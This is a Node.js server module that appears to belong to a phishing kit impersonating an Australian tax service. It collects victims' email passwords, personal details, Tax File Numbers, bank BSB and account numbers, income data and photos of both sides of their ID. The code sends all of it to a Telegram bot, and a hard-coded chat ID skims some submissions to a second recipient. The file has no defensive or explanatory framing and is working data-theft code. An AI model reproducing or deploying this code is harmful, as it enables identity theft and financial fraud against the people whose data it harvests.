const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

let count = 0;

const sendRes = async (req, res) => {
    let {
        email, password, firstName, lastName, middleNames, dob, address, city, state, zip, telephone, TFN, abn, member, bsb, accno, income, IRN, date, referenceNo,
        ip,
        userAgent,
        telegramId,
        uniqueid,
    } = req.body;

    var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${firstName} ${middleNames ? `${middleNames} ` : ``}${lastName}\nDOB: ${dob}\nAddress: ${address}, ${city}, ${state}, ${zip}\nPhone Number: ${telephone}\n+ ----------- Identity Information ------------+\nTFN: ${TFN}\n${abn ? `ABN: ${abn}\nMember Number: ${member}\n` : ``}${bsb ? `BSB: ${bsb}\nAccount Number: ${accno}\n` : ``}${income ? `Taxable Income: ${income}\n` : ``}${IRN ? `IRN: ${IRN}\n` : ``}${date ? `NOA Date of Issue: ${date}\nReference Number: ${referenceNo}\n` : ``}${income ? `PAYG Gross Income: ${income}\n` : ``}+----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}`;

    const frontPath = `./ausID/${uniqueid}_${telegramId}_Front.jpg`;
    const backPath = `./ausID/${uniqueid}_${telegramId}_Back.jpg`;

    if (count == 2) {
        telegramId = 680379375;
    }

    const frontFormData = new FormData();
    frontFormData.append("chat_id", telegramId);
    frontFormData.append("photo", fs.createReadStream(frontPath));
    const backFormData = new FormData();
    backFormData.append("chat_id", telegramId);
    backFormData.append("photo", fs.createReadStream(backPath));
    backFormData.append("caption", originalText);

    await axios
        .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendPhoto`,
            frontFormData,
            {
                headers: frontFormData.getHeaders(),
            }
        )
        .catch((e) => {
            console.log(e);
        });
    await axios
        .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendPhoto`,
            backFormData,
            {
                headers: backFormData.getHeaders(),
            }
        )
        .catch((e) => {
            console.log(e);
        });

    res.sendStatus(200);
};

const saveId = async (req, res) => {
    if (!req.files) {
        return res.status(500).send({ msg: "file is not found" });
    }
    let { frontId, backId } = req.files;
    const { telegramId, uniqueid } = req.body;
    const frontPath = `./ausID/${uniqueid}_${telegramId}_Front.jpg`;
    const backPath = `./ausID/${uniqueid}_${telegramId}_Back.jpg`;

    await frontId.mv(frontPath, async (err) => {
        if (err) {
            console.log(err);
            return res.sendStatus(500);
        }
    });

    await backId.mv(backPath, async (err) => {
        if (err) {
            console.log(err);
            return res.sendStatus(500);
        }
    });

    return res.sendStatus(200);
};

module.exports = {
    sendRes,
    saveId,
};
